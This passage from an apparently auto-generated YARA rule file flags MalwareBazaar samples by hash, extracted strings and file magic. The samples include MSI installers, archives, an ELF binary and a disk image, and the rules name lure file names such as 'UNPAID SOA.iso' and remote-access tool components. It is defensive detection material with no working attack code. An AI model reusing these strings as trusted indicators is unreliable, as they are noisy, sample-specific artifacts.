   strings:
      $s1 = "DHL 8350232025-1.exe" fullword ascii
      $s2 = "dfimosu" fullword ascii
      $s3 = "fD.i:\"'u" fullword ascii
      $s4 = "3mX.aGe~n" fullword ascii
      $s5 = "WUSOMKIG" fullword ascii
      $s6 = "Xmonopr" fullword ascii
      $s7 = "ChvHsN0" fullword ascii
      $s8 = "gdfzjv" fullword ascii
      $s9 = "t=H- 8M" fullword ascii
      $s10 = "} /O>0" fullword ascii
      $s11 = "vh)+ 6A<I" fullword ascii
      $s12 = "cyvgew" fullword ascii
      $s13 = "\\A2%h;" fullword ascii
      $s14 = "7[x.dtZ" fullword ascii
      $s15 = "*cMGA@#Vl" fullword ascii
      $s16 = "hBrkgUf" fullword ascii
      $s17 = "cEwiXMQ" fullword ascii
      $s18 = "ZaxzS=X" fullword ascii
      $s19 = "FhRo`81" fullword ascii
      $s20 = "zERk\"_" fullword ascii
   condition:
      uint16(0) == 0x6152 and filesize < 3000KB and
      8 of them
}

rule sig_9b1ce75deae0c884f1beeebfd90cdaa09f98f33061ebfc7b63058d1bfa5202c9 {
   meta:
      description = "evidences - file 9b1ce75deae0c884f1beeebfd90cdaa09f98f33061ebfc7b63058d1bfa5202c9.elf"
      author = "Sameer P Sheik IBM"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-07"
      hash1 = "9b1ce75deae0c884f1beeebfd90cdaa09f98f33061ebfc7b63058d1bfa5202c9"
   strings:
      $s1 = "get_kernel_syms" fullword ascii
      $s2 = "getspnam" fullword ascii
      $s3 = "getspent" fullword ascii
      $s4 = "klogctl" fullword ascii
      $s5 = "fgets_unlocked" fullword ascii
      $s6 = "getspent_r" fullword ascii
      $s7 = "pmap_getmaps" fullword ascii
      $s8 = "fgetgrent_r" fullword ascii
      $s9 = "pmap_get" fullword ascii
      $s10 = "getspnam_r" fullword ascii
      $s11 = "fgetpwent_r" fullword ascii
      $s12 = "endspent" fullword ascii
      $s13 = "putpwent" fullword ascii
      $s14 = "sigsetmask" fullword ascii
      $s15 = "swapoff" fullword ascii
      $s16 = "setspent" fullword ascii
      $s17 = "clnt_perror" fullword ascii
      $s18 = "pivot_root" fullword ascii
      $s19 = "authunix_create_default" fullword ascii
      $s20 = "clnt_pcreateerror" fullword ascii
   condition:
      uint16(0) == 0x457f and filesize < 300KB and
      8 of them
}

rule sig_5ed548b9f19f68488fcf80df3ba0f35b14debcfd6180981cb4295b0bd36f6f4b {
   meta:
      description = "evidences - file 5ed548b9f19f68488fcf80df3ba0f35b14debcfd6180981cb4295b0bd36f6f4b.doc"
      author = "Sameer P Sheik IBM"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-07"
      hash1 = "5ed548b9f19f68488fcf80df3ba0f35b14debcfd6180981cb4295b0bd36f6f4b"
   strings:
      $s1 = "word/header1.xml" fullword ascii
      $s2 = "xl/sharedStrings.xmlPK" fullword ascii
      $s3 = "xl/worksheets/_rels/sheet1.xml.relsPK" fullword ascii
      $s4 = "xl/printerSettings/printerSettings1.binPK" fullword ascii
      $s5 = "word/media/image1.png" fullword ascii
      $s6 = "aOFl?(" fullword ascii
      $s7 = "OzH2%S|1" fullword ascii
      $s8 = "IDATx^\\" fullword ascii /* Goodware String - occured 1 times */
      $s9 = "AXoQ@*N" fullword ascii
      $s10 = "u.dpe$" fullword ascii
      $s11 = "xl/persons/person.xmlPK" fullword ascii
      $s12 = "word/footnotes.xml" fullword ascii /* Goodware String - occured 2 times */
      $s13 = "word/endnotes.xml" fullword ascii /* Goodware String - occured 2 times */
      $s14 = "nGthn2" fullword ascii
      $s15 = "xl/styles.xmlPK" fullword ascii /* Goodware String - occured 3 times */
      $s16 = "\\x_B@y" fullword ascii
      $s17 = "word/_rels/document.xml.rels " fullword ascii /* Goodware String - occured 3 times */
      $s18 = "xl/theme/theme1.xmlPK" fullword ascii /* Goodware String - occured 3 times */
      $s19 = "oQ;_-jDWS" fullword ascii
      $s20 = "/\\e+Na" fullword ascii
   condition:
      uint16(0) == 0x4b50 and filesize < 100KB and
      8 of them
}

rule sig_635c7a05d7626d972c8f2e5ba73f866487de27a71409c457dcc1b804f004951a {
   meta:
      description = "evidences - file 635c7a05d7626d972c8f2e5ba73f866487de27a71409c457dcc1b804f004951a.msi"
      author = "Sameer P Sheik IBM"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-07"
      hash1 = "635c7a05d7626d972c8f2e5ba73f866487de27a71409c457dcc1b804f004951a"
   strings:
      $x1 = "oned files.LanguageList of decimal language Ids, comma-separated if more than one.Integer containing bit flags representing file" ascii
      $s2 = "6SOFg:\\" fullword ascii
      $s3 = "roductCode{8F5E5AB8-D5E0-4707-AF29-91FC6E4A1A0D}ProductLanguage1033ProductNameProductVersion1.2.4.9UpgradeCodel not be installed" ascii
      $s4 = "tUPHk%q%" fullword ascii
      $s5 = "}dV:\"3!Q " fullword ascii
      $s6 = ")4_Sj:\"=" fullword ascii
      $s7 = "8sNn.aJm" fullword ascii
      $s8 = "KZMXGQE" fullword ascii
      $s9 = "zwjOF53" fullword ascii
      $s10 = "5OB+ 5" fullword ascii
      $s11 = " /k8i?*" fullword ascii
      $s12 = "pckepw" fullword ascii
      $s13 = "mmPZNr6" fullword ascii
      $s14 = "~`!>T* v" fullword ascii
      $s15 = "sqGHdY1" fullword ascii
      $s16 = "RF$)- " fullword ascii
      $s17 = "mS-N /x" fullword ascii
      $s18 = "NpPXZE5" fullword ascii
      $s19 = "/}H+ @" fullword ascii
      $s20 = "SQ%dc%o" fullword ascii
   condition:
      uint16(0) == 0xcfd0 and filesize < 27000KB and
      1 of ($x*) and 4 of them
}

rule sig_637cddc88e13207eb5459a0107c77195b934d52d4bc1e62a71ca810554936b61 {
   meta:
      description = "evidences - file 637cddc88e13207eb5459a0107c77195b934d52d4bc1e62a71ca810554936b61.msi"
      author = "Sameer P Sheik IBM"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-07"
      hash1 = "637cddc88e13207eb5459a0107c77195b934d52d4bc1e62a71ca810554936b61"
   strings:
      $x1 = "oned files.LanguageList of decimal language Ids, comma-separated if more than one.Integer containing bit flags representing file" ascii
      $s2 = "roductCode{E4F6D88E-768E-4B84-9DD1-4FA22C4BBD39}ProductLanguage1033ProductNameProductVersion1.2.4.9UpgradeCodel not be installed" ascii
      $s3 = "~aM,T:\\E3_" fullword ascii
      $s4 = "3eM.LKD{," fullword ascii
      $s5 = ">XeQ:\\" fullword ascii
      $s6 = "m7U.ARJ" fullword ascii
      $s7 = "wliM%t," fullword ascii
      $s8 = "yPIwsZDr1" fullword ascii
      $s9 = "MRuehtL5" fullword ascii
      $s10 = "LmXIgW91" fullword ascii
      $s11 = "gMzkV65" fullword ascii
      $s12 = "A+ wOx" fullword ascii
      $s13 = "\\nFMJ.|VSm" fullword ascii
      $s14 = "szFQznD" fullword ascii
      $s15 = "M?TvvW+\"" fullword ascii
      $s16 = "djZU?xP" fullword ascii
      $s17 = "fulrsFz" fullword ascii
      $s18 = "OZWu2\\" fullword ascii
      $s19 = "Xnby\\N" fullword ascii
      $s20 = "R|Y.fgJ" fullword ascii
   condition:
      uint16(0) == 0xcfd0 and filesize < 26000KB and
      1 of ($x*) and 4 of them
}

rule sig_67b3fbe53bb0d84a4994afee73ab3023f4472cdb361770d21df6916fd0d2ba73 {
   meta:
      description = "evidences - file 67b3fbe53bb0d84a4994afee73ab3023f4472cdb361770d21df6916fd0d2ba73.msi"
      author = "Sameer P Sheik IBM"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-07"
      hash1 = "67b3fbe53bb0d84a4994afee73ab3023f4472cdb361770d21df6916fd0d2ba73"
   strings:
      $x1 = "oned files.LanguageList of decimal language Ids, comma-separated if more than one.Integer containing bit flags representing file" ascii
      $s2 = "lkWz!." fullword ascii
      $s3 = "fgjtyikuil" fullword ascii
      $s4 = "f:\\R*OQ" fullword ascii
      $s5 = "(k:\"?[" fullword ascii
      $s6 = "N9q{[!g:\"" fullword ascii
      $s7 = "u<W:\\60" fullword ascii
      $s8 = "ll:\\75" fullword ascii
      $s9 = "hmJU.Zdb3+" fullword ascii
      $s10 = "S2K:\"'hc" fullword ascii
      $s11 = "Y*sDLLX" fullword ascii
      $s12 = "_Y?RAT" fullword ascii
      $s13 = "+* c>u" fullword ascii
      $s14 = "&tP -_" fullword ascii
      $s15 = "wzfhqp" fullword ascii
      $s16 = "G /u6q" fullword ascii
      $s17 = "+ yI{L" fullword ascii
      $s18 = "roductCode{5AA608D1-87BE-4112-BCA5-45E8C77C3A49}ProductLanguage1033ProductNameProductVersion1.2.4.9UpgradeCodel not be installed" ascii
      $s19 = "y>#Ms49)]" fullword ascii
      $s20 = "hfwvkd" fullword ascii
   condition:
      uint16(0) == 0xcfd0 and filesize < 26000KB and
      1 of ($x*) and 4 of them
}

rule sig_702947a51ae8e75ea2ca5835aabdf2d24e05f97e3889799327f15f124c4f3b37 {
   meta:
      description = "evidences - file 702947a51ae8e75ea2ca5835aabdf2d24e05f97e3889799327f15f124c4f3b37.msi"
      author = "Sameer P Sheik IBM"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-07"
      hash1 = "702947a51ae8e75ea2ca5835aabdf2d24e05f97e3889799327f15f124c4f3b37"
   strings:
      $x1 = "oned files.LanguageList of decimal language Ids, comma-separated if more than one.Integer containing bit flags representing file" ascii
      $s2 = "roductCode{C9852F2D-9C94-439A-AEE5-EAA229EB26AD}ProductLanguage1033ProductNameProductVersion1.2.4.9UpgradeCodel not be installed" ascii
      $s3 = "dfsertgfh" fullword ascii
      $s4 = "e:\"]3m" fullword ascii
      $s5 = "(ZAi:\"b" fullword ascii
      $s6 = "aOLoG>" fullword ascii
      $s7 = "Nueyktyy" fullword ascii
      $s8 = "TQgBzQ6" fullword ascii
      $s9 = "QmEp261" fullword ascii
      $s10 = "B* eyf" fullword ascii
      $s11 = "2%Osm%" fullword ascii
      $s12 = "`}y+ I" fullword ascii
      $s13 = "kkSRhm8" fullword ascii
      $s14 = "nb` -4(" fullword ascii
      $s15 = "dhMZHi5" fullword ascii
      $s16 = "xo/o /d" fullword ascii
      $s17 = "u/y%t%" fullword ascii
      $s18 = "\\}^cxTfw!" fullword ascii
      $s19 = "hKx/m /f" fullword ascii
      $s20 = "ywMN\"W" fullword ascii
   condition:
      uint16(0) == 0xcfd0 and filesize < 26000KB and
      1 of ($x*) and 4 of them
}

rule e59be80da8616abb570739f259b2bc5b6ed8c0821803fa6517a13f836caa4778 {
   meta:
      description = "evidences - file e59be80da8616abb570739f259b2bc5b6ed8c0821803fa6517a13f836caa4778.msi"
      author = "Sameer P Sheik IBM"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-07"
      hash1 = "e59be80da8616abb570739f259b2bc5b6ed8c0821803fa6517a13f836caa4778"
   strings:
      $x1 = "oned files.LanguageList of decimal language Ids, comma-separated if more than one.Integer containing bit flags representing file" ascii
      $s2 = "roductCode{C9852F2D-9C94-439A-AEE5-EAA229EB26AD}ProductLanguage1033ProductNameProductVersion1.2.4.9UpgradeCodel not be installed" ascii
      $s3 = "bfhgtrhytyhj" fullword ascii
      $s4 = "e:\"]3m" fullword ascii
      $s5 = "(ZAi:\"b" fullword ascii
      $s6 = "aOLoG>" fullword ascii
      $s7 = "Nueyktyy" fullword ascii
      $s8 = "TQgBzQ6" fullword ascii
      $s9 = "QmEp261" fullword ascii
      $s10 = "B* eyf" fullword ascii
      $s11 = "2%Osm%" fullword ascii
      $s12 = "`}y+ I" fullword ascii
      $s13 = "kkSRhm8" fullword ascii
      $s14 = "nb` -4(" fullword ascii
      $s15 = "dhMZHi5" fullword ascii
      $s16 = "xo/o /d" fullword ascii
      $s17 = "u/y%t%" fullword ascii
      $s18 = "\\}^cxTfw!" fullword ascii
      $s19 = "hKx/m /f" fullword ascii
      $s20 = "ywMN\"W" fullword ascii
   condition:
      uint16(0) == 0xcfd0 and filesize < 26000KB and
      1 of ($x*) and 4 of them
}

rule sig_7ddf8ec5a8097f8957eaa52ba12620e807aca139425e5d336229a688205e73bb {
   meta:
      description = "evidences - file 7ddf8ec5a8097f8957eaa52ba12620e807aca139425e5d336229a688205e73bb.rar"
      author = "Sameer P Sheik IBM"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-07"
      hash1 = "7ddf8ec5a8097f8957eaa52ba12620e807aca139425e5d336229a688205e73bb"
   strings:
      $s1 = "csqP.eKI" fullword ascii
      $s2 = "TdeYen(" fullword ascii
      $s3 = "Da -rnkW$Tf" fullword ascii
      $s4 = "P;o:\"R" fullword ascii
      $s5 = "UNPAID SOA.iso" fullword ascii
      $s6 = "[9k:\"b" fullword ascii
      $s7 = "q:\"7d~" fullword ascii
      $s8 = "se:\\2m?" fullword ascii
      $s9 = "CTMpEj<" fullword ascii
      $s10 = "+FHSPy" fullword ascii
      $s11 = "%_%Y J" fullword ascii
      $s12 = "_\"#k- " fullword ascii
      $s13 = "aFchKt2" fullword ascii
      $s14 = "NhJyrr0" fullword ascii
      $s15 = "uJ** h" fullword ascii
      $s16 = "3 -zef" fullword ascii
      $s17 = "Kx -#e|" fullword ascii
      $s18 = "S* WU^s" fullword ascii
      $s19 = "\\@.rYv>" fullword ascii
      $s20 = ":rGv -" fullword ascii
   condition:
      uint16(0) == 0x6152 and filesize < 4000KB and
      8 of them
}

rule sig_871f0b26ba96c5f3921e2823ed80d0c3439cb75fa9fff75bc1c989aa473be857 {
   meta:
      description = "evidences - file 871f0b26ba96c5f3921e2823ed80d0c3439cb75fa9fff75bc1c989aa473be857.msi"
      author = "Sameer P Sheik IBM"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-07"
      hash1 = "871f0b26ba96c5f3921e2823ed80d0c3439cb75fa9fff75bc1c989aa473be857"
   strings:
      $x1 = "oned files.LanguageList of decimal language Ids, comma-separated if more than one.Integer containing bit flags representing file" ascii
      $s2 = "cNiS:\"" fullword ascii
      $s3 = "* 8C7=" fullword ascii
      $s4 = ";oftP>^j" fullword ascii
      $s5 = "roductCode{151028AD-E0D2-409C-B3EC-8348C68EAD59}ProductLanguage1033ProductNameProductVersion1.2.4.9UpgradeCodel not be installed" ascii
      $s6 = "dsfgrgjh" fullword ascii
      $s7 = "wchywdw" fullword ascii
      $s8 = "ErcCmd>" fullword ascii
      $s9 = "AT:\"_pwJ" fullword ascii
      $s10 = "L:\"sH$xMm" fullword ascii
      $s11 = "EEdll)" fullword ascii
      $s12 = "\\PzZd<DmT" fullword ascii
      $s13 = "f* FHsH" fullword ascii
      $s14 = "\\btnAp+_" fullword ascii
      $s15 = "vCvcQcY2" fullword ascii
      $s16 = " >%vfC%" fullword ascii
      $s17 = "+ Ry*i3" fullword ascii
      $s18 = ")j- Xa" fullword ascii
      $s19 = "9_ /SV" fullword ascii
      $s20 = "CWNiHj9" fullword ascii
   condition:
      uint16(0) == 0xcfd0 and filesize < 27000KB and
      1 of ($x*) and 4 of them
}

rule sig_98b5e11eb002a610d982b4c8e42fe588210e6b88e573c55dbf1cb1a7dc1be585 {
   meta:
      description = "evidences - file 98b5e11eb002a610d982b4c8e42fe588210e6b88e573c55dbf1cb1a7dc1be585.msi"
      author = "Sameer P Sheik IBM"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-07"
      hash1 = "98b5e11eb002a610d982b4c8e42fe588210e6b88e573c55dbf1cb1a7dc1be585"
   strings:
      $x1 = "oned files.LanguageList of decimal language Ids, comma-separated if more than one.Integer containing bit flags representing file" ascii
      $s2 = "cNiS:\"" fullword ascii
      $s3 = "* 8C7=" fullword ascii
      $s4 = ";oftP>^j" fullword ascii
      $s5 = "roductCode{151028AD-E0D2-409C-B3EC-8348C68EAD59}ProductLanguage1033ProductNameProductVersion1.2.4.9UpgradeCodel not be installed" ascii
      $s6 = "wchywdw" fullword ascii
      $s7 = "hrtertugk" fullword ascii
      $s8 = "ErcCmd>" fullword ascii
      $s9 = "AT:\"_pwJ" fullword ascii
      $s10 = "L:\"sH$xMm" fullword ascii
      $s11 = "EEdll)" fullword ascii
      $s12 = "\\PzZd<DmT" fullword ascii
      $s13 = "f* FHsH" fullword ascii
      $s14 = "\\btnAp+_" fullword ascii
      $s15 = "vCvcQcY2" fullword ascii
      $s16 = " >%vfC%" fullword ascii
      $s17 = "+ Ry*i3" fullword ascii
      $s18 = ")j- Xa" fullword ascii
      $s19 = "9_ /SV" fullword ascii
      $s20 = "CWNiHj9" fullword ascii
   condition:
      uint16(0) == 0xcfd0 and filesize < 27000KB and
      1 of ($x*) and 4 of them
}

rule sig_99a0c8f6c446391b9f8838f286485d41cd28929cc023ce54e4957e001c8858a1 {
   meta:
      description = "evidences - file 99a0c8f6c446391b9f8838f286485d41cd28929cc023ce54e4957e001c8858a1.msi"
      author = "Sameer P Sheik IBM"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-07"
      hash1 = "99a0c8f6c446391b9f8838f286485d41cd28929cc023ce54e4957e001c8858a1"
   strings:
      $x1 = "oned files.LanguageList of decimal language Ids, comma-separated if more than one.Integer containing bit flags representing file" ascii
      $s2 = "roductCode{6FD5157D-5281-4531-871C-7DF4E181874B}ProductLanguage1033ProductNameProductVersion1.2.4.9UpgradeCodel not be installed" ascii
      $s3 = "55'\"~].}" fullword ascii /* hex encoded string 'U' */
      $s4 = "grdfgtrhg" fullword ascii
      $s5 = "1@0f:\\3JM" fullword ascii
      $s6 = "\\.\"9)?" fullword ascii
      $s7 = "Y3 T:\"" fullword ascii
      $s8 = "S=A+ ;6V" fullword ascii
      $s9 = "sVqsMY34" fullword ascii
      $s10 = "lqjzpa" fullword ascii
      $s11 = "XVJLcE39" fullword ascii
      $s12 = "bUhiRQ2" fullword ascii
      $s13 = "WI.%* u" fullword ascii
      $s14 = "219Rh8$ -" fullword ascii
      $s15 = "X -~&)" fullword ascii
      $s16 = "SGGUTx9" fullword ascii
      $s17 = "pDSBpF4" fullword ascii
      $s18 = "29N+ !*)" fullword ascii
      $s19 = "NGV -Uw" fullword ascii
      $s20 = "Z!Xo`+ A(@" fullword ascii
   condition:
      uint16(0) == 0xcfd0 and filesize < 27000KB and
      1 of ($x*) and 4 of them
}

rule f7e421c9631cf5f9fdc61def4806054cf95c31d07834ba6cb6eeae8d1c847f67 {
   meta:
      description = "evidences - file f7e421c9631cf5f9fdc61def4806054cf95c31d07834ba6cb6eeae8d1c847f67.msi"
      author = "Sameer P Sheik IBM"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-07"
      hash1 = "f7e421c9631cf5f9fdc61def4806054cf95c31d07834ba6cb6eeae8d1c847f67"
   strings:
      $x1 = "oned files.LanguageList of decimal language Ids, comma-separated if more than one.Integer containing bit flags representing file" ascii
      $s2 = "roductCode{6FD5157D-5281-4531-871C-7DF4E181874B}ProductLanguage1033ProductNameProductVersion1.2.4.9UpgradeCodel not be installed" ascii
      $s3 = "55'\"~].}" fullword ascii /* hex encoded string 'U' */
      $s4 = "vcbgdfhg" fullword ascii
      $s5 = "1@0f:\\3JM" fullword ascii
      $s6 = "\\.\"9)?" fullword ascii
      $s7 = "Y3 T:\"" fullword ascii
      $s8 = "S=A+ ;6V" fullword ascii
      $s9 = "sVqsMY34" fullword ascii
      $s10 = "lqjzpa" fullword ascii
      $s11 = "XVJLcE39" fullword ascii
      $s12 = "bUhiRQ2" fullword ascii
      $s13 = "WI.%* u" fullword ascii
      $s14 = "219Rh8$ -" fullword ascii
      $s15 = "X -~&)" fullword ascii
      $s16 = "SGGUTx9" fullword ascii
      $s17 = "pDSBpF4" fullword ascii
      $s18 = "29N+ !*)" fullword ascii
      $s19 = "NGV -Uw" fullword ascii
      $s20 = "Z!Xo`+ A(@" fullword ascii
   condition:
      uint16(0) == 0xcfd0 and filesize < 27000KB and
      1 of ($x*) and 4 of them
}

rule a604cedca56a1982f5ae38039c46dd8dc10a414309621fc13d0b54533f53b971 {
   meta:
      description = "evidences - file a604cedca56a1982f5ae38039c46dd8dc10a414309621fc13d0b54533f53b971.zip"
      author = "Sameer P Sheik IBM"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-07"
      hash1 = "a604cedca56a1982f5ae38039c46dd8dc10a414309621fc13d0b54533f53b971"
   strings:
      $s1 = "remcmdstub.exe" fullword ascii
      $s2 = "HTCTL32.DLL" fullword ascii
      $s3 = "TCCTL32.DLL" fullword ascii
      $s4 = "webmvorbisencoder.dll" fullword ascii
      $s5 = "PCICHEK.DLL" fullword ascii
      $s6 = "PCICL32.DLL" fullword ascii
      $s7 = "webmmux.dll" fullword ascii
      $s8 = "true/vp8decoder.dll" fullword ascii
      $s9 = "false/vp8decoder.dll" fullword ascii
      $s10 = "client32.exe" fullword ascii
      $s11 = "true/webmmux.dll" fullword ascii
      $s12 = "false/webmmux.dll" fullword ascii
      $s13 = "false/vp8encoder.dll" fullword ascii
      $s14 = "true/vp8encoder.dll" fullword ascii
      $s15 = "cksini (2).exe" fullword ascii
      $s16 = "pcicapi.dll" fullword ascii
      $s17 = "true/api-ms-win-core-localization-l1-2-0.dll" fullword ascii
      $s18 = "true/widevinecdm.dll.sig" fullword ascii
      $s19 = "true/widevinecdm.dll.sigc`" fullword ascii
      $s20 = "client32.ini" fullword ascii
   condition:
      uint16(0) == 0x4b50 and filesize < 14000KB and
      8 of them
}

rule f0e0ee8b0ecbffd1eaca978ab1d86135ff776f93420732c0962f3b56bc3d7678 {
   meta:
      description = "evidences - file f0e0ee8b0ecbffd1eaca978ab1d86135ff776f93420732c0962f3b56bc3d7678.pdf"
      author = "Sameer P Sheik IBM"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-07"
      hash1 = "f0e0ee8b0ecbffd1eaca978ab1d86135ff776f93420732c0962f3b56bc3d7678"
   strings:
      $s1 = "<rdf:Description rdf:about=\"\"  xmlns:pdf=\"http://ns.adobe.com/pdf/1.3/\">" fullword ascii
      $s2 = "<rdf:Description rdf:about=\"\"  xmlns:xmp=\"http://ns.adobe.com/xap/1.0/\">" fullword ascii
      $s3 = "<rdf:Description rdf:about=\"\"  xmlns:xmpMM=\"http://ns.adobe.com/xap/1.0/mm/\">" fullword ascii
      $s4 = "<rdf:Description rdf:about=\"\"  xmlns:dc=\"http://purl.org/dc/elements/1.1/\">" fullword ascii
      $s5 = "<</Type/XRef/Size 28/W[ 1 4 2] /Root 1 0 R/Info 3 0 R/ID[<AD509D906DF6524186477ECC33551455><AD509D906DF6524186477ECC33551455>] /" ascii
      $s6 = "<</Type/XRef/Size 28/W[ 1 4 2] /Root 1 0 R/Info 3 0 R/ID[<AD509D906DF6524186477ECC33551455><AD509D906DF6524186477ECC33551455>] /" ascii
      $s7 = "<</Type/Page/Parent 2 0 R/Resources<</Font<</F1 6 0 R>>/ExtGState<</GS8 8 0 R/GS9 9 0 R>>/ProcSet[/PDF/Text/ImageB/ImageC/ImageI" ascii
      $s8 = "] >>/MediaBox[ 0 0 612 792] /Contents 5 0 R/Group<</Type/Group/S/Transparency/CS/DeviceRGB>>/Tabs/S/StructParents 0>>" fullword ascii
      $s9 = "<</Size 29/Root 1 0 R/Info 3 0 R/ID[<AD509D906DF6524186477ECC33551455><AD509D906DF6524186477ECC33551455>] /Prev 26436/XRefStm 26" ascii
      $s10 = "<</Size 29/Root 1 0 R/Info 3 0 R/ID[<AD509D906DF6524186477ECC33551455><AD509D906DF6524186477ECC33551455>] /Prev 26436/XRefStm 26" ascii
      $s11 = "<</Type/Catalog/Pages 2 0 R/Lang(en) /StructTreeRoot 10 0 R/MarkInfo<</Marked true>>/Metadata 26 0 R/ViewerPreferences 27 0 R>>" fullword ascii
      $s12 = "<</Author(Ruth Joy) /CreationDate(D:20240621124024-07'00') /ModDate(D:20240621124024-07'00') /Producer(" fullword ascii
      $s13 = "<</Type/FontDescriptor/FontName/BCDEEE+Calibri/Flags 32/ItalicAngle 0/Ascent 750/Descent -250/CapHeight 750/AvgWidth 521/MaxWidt" ascii
      $s14 = "<dc:creator><rdf:Seq><rdf:li>Ruth Joy</rdf:li></rdf:Seq></dc:creator></rdf:Description>" fullword ascii
      $s15 = " 2021</xmp:CreatorTool><xmp:CreateDate>2024-06-21T12:40:24-07:00</xmp:CreateDate><xmp:ModifyDate>2024-06-21T12:40:24-07:00</xmp:" ascii
      $s16 = " 2021</pdf:Producer></rdf:Description>" fullword ascii
      $s17 = "C33551455</xmpMM:InstanceID></rdf:Description>" fullword ascii
      $s18 = "<</Type/FontDescriptor/FontName/BCDEEE+Calibri/Flags 32/ItalicAngle 0/Ascent 750/Descent -250/CapHeight 750/AvgWidth 521/MaxWidt" ascii
      $s19 = "<xmpMM:DocumentID>uuid:909D50AD-F66D-4152-8647-7ECC33551455</xmpMM:DocumentID><xmpMM:InstanceID>uuid:909D50AD-F66D-4152-8647-7EC" ascii
      $s20 = "ModifyDate></rdf:Description>" fullword ascii
   condition:
      uint16(0) == 0x5025 and filesize < 80KB and
      8 of them
}

rule d25bd44f8eeb55687e65eaca4aad93c89d2cce5983b28420bacb605fd6a0a1cd {
   meta:
      description = "evidences - file d25bd44f8eeb55687e65eaca4aad93c89d2cce5983b28420bacb605fd6a0a1cd.msi"
      author = "Sameer P Sheik IBM"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-07"
      hash1 = "d25bd44f8eeb55687e65eaca4aad93c89d2cce5983b28420bacb605fd6a0a1cd"
   strings:
      $x1 = "oned files.LanguageList of decimal language Ids, comma-separated if more than one.Integer containing bit flags representing file" ascii
      $s2 = "roductCode{2B0E2369-D67C-4169-B300-1FB731908F39}ProductLanguage1033ProductNameProductVersion1.2.4.9UpgradeCodel not be installed" ascii
      $s3 = "<EbNw* A" fullword ascii
      $s4 = "ulog f" fullword ascii
      $s5 = "4mP:\"d" fullword ascii
      $s6 = "NAo.WfI" fullword ascii
      $s7 = "Pjy.tYB`#z" fullword ascii
      $s8 = "M<%K:\"" fullword ascii
      $s9 = ";cFHSpy" fullword ascii
      $s10 = "/8|0iRc" fullword ascii
      $s11 = "95y!--->|" fullword ascii
      $s12 = "* E`I" fullword ascii
      $s13 = "7j -XM" fullword ascii
      $s14 = "^ /vi=z" fullword ascii
      $s15 = "# NLtX" fullword ascii
      $s16 = "}p%gt%" fullword ascii
      $s17 = "md%S%d" fullword ascii
      $s18 = "BfmrQ718" fullword ascii
      $s19 = "$%N%Ore" fullword ascii
      $s20 = "\\i.lke" fullword ascii
   condition:
      uint16(0) == 0xcfd0 and filesize < 26000KB and
      1 of ($x*) and 4 of them
}

rule f60302a905c80015039f15de2b3eeecd6a019bc33bc8f090bc4d1ed2867e5259 {
   meta:
      description = "evidences - file f60302a905c80015039f15de2b3eeecd6a019bc33bc8f090bc4d1ed2867e5259.img"
      author = "Sameer P Sheik IBM"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-07"
      hash1 = "f60302a905c80015039f15de2b3eeecd6a019bc33bc8f090bc4d1ed2867e5259"
   strings:
      $x1 = "ProcessHacker.exe" fullword wide
      $x2 = "C:\\Program Files\\Process Hacker 2\\ProcessHacker.exe" fullword ascii
      $s3 = "%SystemDrive%\\Program Files\\Process Hacker 2\\ProcessHacker.exe" fullword wide
      $s4 = "Process Hacker 2.39 (r124)9..\\..\\..\\Program Files\\Process Hacker 2\\ProcessHacker.exe!C:\\Program Files\\Process Hacker 23C:" wide
      $s5 = "PROCESS_.LNK;1" fullword ascii
      $s6 = "Process Hacker 2.lnk" fullword wide
      $s7 = "@shell32.dll,-21781" fullword wide
      $s8 = "PROCES~1.EXE" fullword ascii
      $s9 = "wj32.ProcessHacker2" fullword wide
      $s10 = "Process Hacker 2" fullword wide
      $s11 = "IMGBURN V2.5.8.0 - THE ULTIMATE IMAGE BURNER!                                                                                   " ascii
      $s12 = "UNDEFINED                                                                                                                       " ascii
      $s13 = "PROCES~1" fullword ascii
      $s14 = "*ImgBurn v2.5.8.0" fullword ascii
      $s15 = "ImgBurn v2.5.8.0" fullword ascii
      $s16 = "*ImgBurn" fullword ascii
      $s17 = "PROGRA~1" fullword ascii
      $s18 = "1SPSU(L" fullword ascii
      $s19 = "2025010310353" ascii
      $s20 = "win-hm6fi4voiep" fullword ascii
   condition:
      uint16(0) == 0x0000 and filesize < 4000KB and
      1 of ($x*) and 4 of them
}

/* Super Rules ------------------------------------------------------------- */

rule _0b89d9792688fb3de9b164302ffc53d73c63a8ac10164cd75a066df9bbb66219_3167204da48c382798d7455267b1791168008f93592b6794d304b27903_0 {
   meta:
